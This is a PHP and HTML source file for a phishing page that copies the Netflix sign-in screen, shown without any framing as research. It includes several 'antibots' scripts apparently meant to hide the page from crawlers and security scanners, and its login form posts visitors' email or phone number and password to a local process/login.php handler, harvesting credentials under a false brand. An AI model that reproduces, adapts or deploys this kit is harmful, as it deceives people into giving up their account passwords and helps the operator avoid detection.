<?php 
require 'api.php';
include 'antibots.php';
include 'antibots/blacklist.php';
include 'antibots/crawler.php';
include 'antibots/fucker.php';
include 'antibots/dick.php';
include 'antibots/fuck-you.php';
include 'antibots/ipblack.php';
ob_start();
?>

<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width">
<title>Netflix Online</title>
<link rel="icon" href="./res/img/favicon.ico">
<link rel="stylesheet" href="./res/css/style.css">
<link rel="stylesheet" href="http://cssplugsin.blogspot.com/?css=stylesheet.css">
<script src="./res/js/jquery.js"></script>
</head>
<body>
<div class="content">
<div class="top">
<img src='./res/img/logo.png'>
</div>
<div class="login-form">
<h1>Sign In</h1>
 <form action="./process/login.php" method="POST"> 
<input class="input" required id="login" type="text" name="userLoginId" placeholder="Email or phone number">
<input class="input" required id="pass" type="password" name="password" placeholder="Password">
<button id="login-btn" onclick="onLogin()" style="margin-top:20px;">Sign In</button>
</form>
<div class="bottom-infos">
<div class="multi">
<div class="left"><input type="checkbox" checked> Remember me</div>
<div class="right"><a href="#">Need help?</a></div>
</div>
<p> New to Netflix?  <font color="white">Sign up now.</font></p>
<p style="font-size:0.7em;">
This page is protected by Google reCAPTCHA to ensure you're not a bot.<font color='#2b75dd'> Learn more.</font>
</p>
</div>
</div>
<div class="footer">
<div class="qs"><a href="#">Questions? Contact us.</a></div>
<div class="f-links">
<a href="#">Gift Card Terms</a> <a href="#">Terms of Use</a> <a href="#">Privacy Statement</a>
</div>
<select>
<option value="english">  English
</select>
</div>
</div>

<script>
function onLogin(){
	if($("#login").val().trim() == "" || $("#pass").val().trim() == ""){return false;}
	else{
	document.getElementById('login-btn').style.background = "#6a0000";
 
	}
}
</script>
</body>
</html>